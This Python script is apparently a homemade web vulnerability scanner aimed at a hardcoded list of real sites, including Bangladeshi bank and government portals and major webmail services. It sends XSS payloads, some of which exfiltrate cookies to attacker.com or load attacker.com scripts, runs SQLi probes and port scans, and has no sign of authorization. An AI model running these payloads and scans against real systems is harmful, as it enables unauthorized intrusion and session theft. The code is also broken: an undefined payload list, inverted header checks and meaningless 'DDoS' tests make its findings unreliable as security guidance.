import secrets
import requests
import time
import re
from bs4 import BeautifulSoup
import socket
import ssl
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from urllib.parse import urlparse

# List of URLs to scan
urls = ['https://www.bb.org.bd/en/index.php','https://www.sonalibank.com.bd/','http://giupmo.gov.bd/',
        'https://ictd.gov.bd/','https://www.nytimes.com/','https://www.foodnetwork.com/','https://www.allrecipes.com/','https://www.bbc.com/news',
        'https://www.who.int/','https://www.nasa.gov/','https://chaldal.com/','https://www.daraz.com.bd/',
        'https://www.rokomari.com/','https://bikroy.com/','https://www.techshohor.com/','https://www.bioscopelive.com/',
'https://nagad.com.bd/','https://www.priyo.com/','https://www.samakal.com/','https://www.cyberaces.org/',
'https://www.hackthissite.org/','https://tryhackme.com/',
'https://www.yahoo.com','https://www.facebook.com','https://www.gmail.com','https://www.hotmail.com','https://securelist.com/']

# Payloads for SQLi and XSS
xss_payloads = ["<script>alert('XSS')</script>",
                "<script>alert(document.cookie)</script>",
                "<script>document.write(\"<img src='http://attacker.com/?cookie=\"+document.cookie+\"'/>\")</script>",
                "<body onload='alert(\"XSS\")'>",
                "<marquee><script>alert('XSS')</script></marquee>",
                "<input type='text' onfocus='alert(\"XSS\")'>",
                "<a href='javascript:alert(\"XSS\")'>",
                "<a href='javascript:document.location=\"http://attacker.com/?cookie=\"+document.cookie'>",
                "<img src=x onerror=\"alert('XSS')\">",
                "'><script>alert('XSS')</script>",
                "\"'><script>alert('XSS')</script>",
                "--><script>alert('XSS')</script>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "'); alert('XSS'); //", "<img src=1 onerror=\"if (this.src != 'http://attacker.com/xss.js') this.src='http://attacker.com/xss.js'\">"]

# CSRF token
csrf_token = "some_csrf_token"

# Headers for CSRF
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}

# Function to check for SQLi vulnerability
def check_sqli(url, input_field):

    try:
        for payload in sqli_payloads:
            # Send HTTP request with SQLi payload
            response = requests.post(url, data={input_field: payload})
            # Parse HTML response
            soup = BeautifulSoup(response.text, 'html.parser')
            # Check if SQLi vulnerability exists
            if payload in soup.text:
                print(f"[+] SQLi vulnerability detected in {url} input field {input_field}")
    except:
        pass
# Function to generate XSS payloads
def generate_payloads():
    payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<svg/onload=alert("XSS")>',
        '<img src=javascript:alert("XSS")>',
        '<a href="javascript:alert(\'XSS\')">Click me</a>',
        '<img src=x:x onerror=alert("XSS")>',
        '<script>prompt("XSS")</script>',
        '<input type="text" value=""\'""><script>alert("XSS")</script>',
        '<img src=x onerror="alert(String.fromCharCode(88,83,83))">',
        '<b/onclick=alert(\'XSS\')>Click me</b>',
        '<img src=x onerror=alert(/XSS/.source)>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<marquee/onstart=alert("XSS")>Test</marquee>',
        '<img src=x onerror=alert(1)>',
        '<img src=x oneonerrorrror=alert(1)>',
        '<script>alert(1)</script>',
        '<img src=x:alert(alt) onerror=eval(src) alt="XSS">',
        '<script>alert(document.domain)</script>',
        '<img src=`javascript:alert("XSS")`>',
        '<img src= onerror="alert(String.fromCharCode(88,83,83))">',
        '<img src=x:alert(alt) onerror=eval(src) alt="XSS">',
        '<iframe src="vbscript:alert(\'XSS\')">',
        '<a href="javascript:alert(document.domain)">Click me</a>',
        '<img src=x onerror="alert(/XSS/.source)">',
        '<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</script>',
        '<img src=`javascript:alert(/XSS/.source)`>',
        '<img src= onerror=alert(1)>,<img src= onerror=alert(2)>',
        '<img src=x onerror=alert(1)//">',
        '<script>confirm("XSS")</script>',
        '<img src=x:alert(alt) onerror=eval(src) alt="XSS">',
        '<img src=`javascript:alert(/XSS/.source)`>',
        '<img src=`javascript:alert("XSS")`>',
        '<img src= onerror="alert(String.fromCharCode(88,83,83))">',
        '<img src=x onerror=alert(1) onmouseover=alert(2)>',
        '<svg/onload=alert(1)>',
        '<a href="javascript:alert(\'XSS\')">Click me</a>',
        '<img src=x onerror="alert(document.domain)">',
        '<script>alert(document.cookie)</script>',
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        '<img src=x onerror=alert(1)//',
        '<svg/onload=alert(/XSS/.source)>',
        '<img src=x onerror=alert(1) onerror=alert(2)>',
        '<script>location.href="javascript:alert(\'XSS\')"',
    ]
    return payloads
# Function to check for XSS vulnerability
def check_xss(url, input_field_name):
    try:
        # Use a large and diverse set of XSS payloads
        payloads = generate_payloads() + xss_payloads
        # Test different HTTP methods
        methods = ['GET', 'POST', 'PUT', 'DELETE']
        # Test different input fields, including text boxes, drop-down menus, and radio buttons
        input_fields = ['text', 'textarea', 'select', 'input[type=text]', 'input[type=password]', 'input[type=number]', 'input[type=email]', 'input[type=tel]', 'input[type=url]', 'input[type=search]']
        for method in methods:
            for field in input_fields:
                for payload in payloads:
                    # Send HTTP request with XSS payload
                    if method in ['GET', 'DELETE']:
                        response = requests.request(method, url, params={field: payload})
                    else:
                        response = requests.request(method, url, data={field: payload})
                    # Check if XSS vulnerability exists in server-side response
                    if payload in response.text:
                        print(f"[+] Server-side XSS vulnerability detected in {url} input field {field}")
                    # Check if XSS vulnerability exists in client-side code
                    if payload in response.content:
                        print(f"[+] Client-side XSS vulnerability detected in {url} input field {field}")
                    # Check if encoding or sanitization functions are properly implemented
                    if '<' in response.text or '>' in response.text:
                        print(f"[+] Encoding or sanitization function may be improperly implemented in {url} input field {field}")
    except Exception as e:
        print(f"Error occurred: {str(e)}")
    except:
        pass

# Function to check for CSRF vulnerability
def check_csrf(url, csrf_token):
    try:
        # Generate a random CSRF token
        csrf_token = secrets.token_hex(32)
        # Set an expiration time for the token (e.g., 5 minutes from now)
        expiration_time = time.time() + 300
        # Send HTTP request with CSRF token
        response = requests.post(url, data={'csrf_token': csrf_token}, headers=headers, cookies={'csrf_token': csrf_token, 'SameSite': 'Lax', 'Secure': 'True'})
        # Check if CSRF vulnerability exists
        if response.status_code == 200:
            # Check if CSRF token is required for the form submission
            if 'csrf_token' in response.text:
                # Check if the CSRF token is present and valid
                if csrf_token in response.text and time.time() <= expiration_time:
                    print(f"[+] No CSRF vulnerability detected in {url}")
                    return
            # Check if the server-side validation of the CSRF token is properly implemented
            elif 'invalid csrf token' in response.text.lower():
                print(f"[+] No CSRF vulnerability detected in {url}")
                return
        # CSRF vulnerability detected
        print(f"[+] CSRF vulnerability detected in {url}")
    except:
        pass

# Function to check for sensitive data exposure vulnerability
def check_sensitive_data(url):
    try:
        # Send HTTP request to get the page HTML
        response = requests.get(url)

        # Check for sensitive data exposure
        sensitive_data_patterns = [
            r"(?<!\d)(4[0-9]{12}(?:[0-9]{3})?)\b",  # Credit card numbers
            r"\b(?!0{5})\d{5}\b",  # Zip codes
            r"\b\d{3}-\d{2}-\d{4}\b",  # Social security numbers
            r"\b\d{4}\b",  # PINs
            r"password",  # Passwords
            r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b",  # Email addresses
            r"\b(\d{1}-)?\(?\d{3}\)?[\s.-]\d{3}[\s.-]\d{4}\b",  # Phone numbers
            r"\b[A-Za-z]{2}\d{7}\b",  # National ID numbers
        ]

        # Check for sensitive data in HTML response
        for pattern in sensitive_data_patterns:
            match = re.search(pattern, response.text, re.IGNORECASE)
            if match:
                return f"Sensitive Data Exposure ({match.group(0)})"

        # Check for sensitive data in other file types (CSS, JS, etc.)
        file_extensions = ["js", "css"]
        for file_extension in file_extensions:
            for file_url in re.findall(r'(?<=src=").+?\.' + file_extension + r'(?=")', response.text):
                try:
                    file_response = requests.get(file_url)
                    for pattern in sensitive_data_patterns:
                        match = re.search(pattern, file_response.text, re.IGNORECASE)
                        if match:
                            return f"Sensitive Data Exposure ({match.group(0)}) in file {file_url}"
                except requests.exceptions.RequestException:
                    pass

        return None

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

    except:
        pass

# Function to check for security misconfiguration vulnerability
def check_security_misconfig(url):
    try:
        # Send HTTP request to get the page HTML
        response = requests.get(url)

        # Check for security misconfigurations
        security_headers = {
            "Server": "Apache",
            "X-Powered-By": None,
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
            # Add more security headers here
        }

        for header, value in security_headers.items():
            if value is not None and response.headers.get(header) == value:
                print(f"[+] Security misconfiguration vulnerability detected in {url}: {header} header set to {value}")

        # Check SSL/TLS certificate issues
        if "https://" in url:
            if response.history and response.history[0].status_code == 301:
                print(f"[+] Security misconfiguration vulnerability detected in {url}: HTTPS redirection not enabled")
            elif not response.history and response.url != url:
                print(f"[+] Security misconfiguration vulnerability detected in {url}: HTTPS not enforced")
            elif "certificate" in response.text:
                print(f"[+] Security misconfiguration vulnerability detected in {url}: SSL/TLS certificate issue detected")

        # Check for common vulnerabilities
        if response.status_code == 200:
            if "Index of /" in response.text:
                print(f"[+] Security misconfiguration detected in {url}: Directory listing enabled")
            if "default password" in response.text:
                print(f"[+] Security misconfiguration detected in {url}: Default credentials found")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
    except:
        pass

# Function to calculate average traffic and detect traffic spikes
def analyze_traffic(url, traffic_history):
    traffic = len(requests.get(url).content)
    traffic_history.append(traffic)
    avg_traffic = sum(traffic_history) / len(traffic_history)

    if traffic > avg_traffic * 1.5:
        print(f"[+] Traffic spike detected in {url}")

    return traffic_history

# Function to check for DDoS vulnerabilities
def check_ddos(url, traffic_threshold, request_threshold, failed_request_threshold, ip_request_threshold, rate_limit_window, rate_limit_threshold, whitelist_ips, blacklist_ips):
    try:
        traffic_history = []

        # Check for abnormal traffic patterns
        traffic = len(requests.get(url).content)
        if traffic > traffic_threshold:
            print(f"[+] Possible DDoS vulnerability detected in {url}")

        # Analyze traffic patterns over time
        traffic_history = analyze_traffic(url, traffic_history)
        for _ in range(4):
            time.sleep(10)
            traffic_history = analyze_traffic(url, traffic_history)

        # Check for other signs of DDoS attacks
        response = requests.get(url)
        num_requests = len(response.history)
        num_failed_requests = sum(1 for r in response.history if r.status_code >= 400)
        ip_counts = {}
        for r in response.history:
            if r.status_code == 200:
                ip = r.headers.get('X-Forwarded-For') or r.headers.get('X-Real-Ip') or r.headers.get('REMOTE_ADDR')
                if ip in ip_counts:
                    ip_counts[ip] += 1
                else:
                    ip_counts[ip] = 1
        if num_requests > request_threshold:
            print(f"[+] Possible DDoS vulnerability detected in {url}: {num_requests} requests in the last 10 minutes")
        if num_failed_requests > failed_request_threshold:
            print(f"[+] Possible DDoS vulnerability detected in {url}: {num_failed_requests} failed requests in the last 10 minutes")
        if max(ip_counts.values(), default=0) > ip_request_threshold:
            print(f"[+] Possible DDoS vulnerability detected in {url}: {max(ip_counts.values())} requests from a single IP address")

        # Rate Limiting
        if rate_limit_window > 0:
            ip = response.headers.get('X-Forwarded-For') or response.headers.get('X-Real-Ip') or response.headers.get('REMOTE_ADDR')
            if ip in whitelist_ips:
                # Allow requests from whitelisted IPs
                return
            if ip in blacklist_ips:
                # Block requests from blacklisted IPs
                print(f"[+] Request from blacklisted IP detected: {ip}")
                return
            if ip in ip_counts and ip_counts[ip] > rate_limit_threshold:
                print(f"[+] Rate limit exceeded for IP: {ip}. Blocking requests for {rate_limit_window} seconds.")
                time.sleep(rate_limit_window)

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
    except:
        pass

#Usage
traffic_threshold = 10000000
request_threshold = 1000000
failed_request_threshold = 1000
ip_request_threshold = 1000
rate_limit_window = 100
rate_limit_threshold = 100
whitelist_ips = ["127.0.0.1"]  # Add trusted IP addresses to the whitelist
blacklist_ips = ["10.0.0.1"]   # Add known malicious IP addresses to the blacklist
# Function to extract the hostname from the target URL
def extract_hostname(url):
    parsed_url = urlparse(url)
    if parsed_url.netloc:
        return parsed_url.netloc
    else:
        return parsed_url.path.split('/')[0]

# Function to check for open ports
def check_open_ports(url):
    hostname = extract_hostname(url)
    open_ports = []

    ports_to_check = [80, 443, 22, 21, 23, 3389, 25, 110, 143, 53, 4433, 3306, 5432, 1521, 1433,
                      27017, 11211, 5060, 8888, 389, 445, 1434, 139, 3309, 5800, 5900, 67, 68,
                      161, 514, 123, 8080, 8443, 5901, 54321, 6667, 7001, 8000, 8009, 8089, 8880,
                      9418, 27018, 27019, 2812, 10000, 8083, 9100, 8444, 3000, 17500]

    for port in ports_to_check:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((hostname, port))
        if result == 0:
            open_ports.append(port)
        sock.close()

    return open_ports

# Function to check for SSL/TLS vulnerabilities and perform certificate validation
def check_ssl_vulnerabilities(url):
    hostname = extract_hostname(url)
    try:
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as secure_sock:
                cipher_suites = secure_sock.cipher()
                weak_ciphers = ['TLS_RSA_WITH_RC4_128_MD5', 'TLS_RSA_WITH_RC4_128_SHA']
                weak_cipher_detected = any(cipher in weak_ciphers for cipher in cipher_suites)

                if weak_cipher_detected:
                    print("Weak cipher suite detected.")
                else:
                    print("No weak cipher suite detected.")

                ssl_version = secure_sock.version()
                if ssl_version == 'TLSv1' or ssl_version == 'SSLv3':
                    print("Vulnerable SSL/TLS protocol version detected.")
                else:
                    print("No vulnerable SSL/TLS protocol version detected.")

                # Perform certificate validation
                cert = secure_sock.getpeercert(binary_form=True)  # Get the certificate in binary form
                x509_cert = x509.load_der_x509_certificate(cert, default_backend())
                subject = x509_cert.subject.rfc4514_string()
                issuer = x509_cert.issuer.rfc4514_string()
                validity = x509_cert.not_valid_after
                print(f"Subject: {subject}")
                print(f"Issuer: {issuer}")
                print(f"Validity: {validity}")

    except ssl.SSLError as e:
        print(f"An SSL/TLS error occurred: {e}")
    except socket.gaierror:
        print("Hostname could not be resolved.")
    except socket.error:
        print("Could not connect to the server.")

# Perform web application network security testing
def web_app_security_testing(url):
    print("Checking for open ports:")
    open_ports = check_open_ports(url)
    if open_ports:
        print(f"Open ports found: {open_ports}. Major vulnerability.")
    else:
        print("No open ports found. No vulnerability.")

    print("Checking for SSL/TLS vulnerabilities and performing certificate validation:")
    check_ssl_vulnerabilities(url)

# Loop through URLs and input fields to check for vulnerabilities
for url in urls:
    # Check for SQLi, XSS, and CSRF vulnerabilities in input fields
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    for input_field in soup.find_all('input'):
        check_sqli(url, input_field.get('name'))
        check_xss(url, input_field.get('name'))
    check_csrf(url, csrf_token)
    # Check for sensitive data exposure and security misconfigurations
    web_app_security_testing(url)
    check_sensitive_data(url)
    check_security_misconfig(url)
    check_ddos( url , traffic_threshold, request_threshold, failed_request_threshold, ip_request_threshold, rate_limit_window, rate_limit_threshold, whitelist_ips, blacklist_ips)
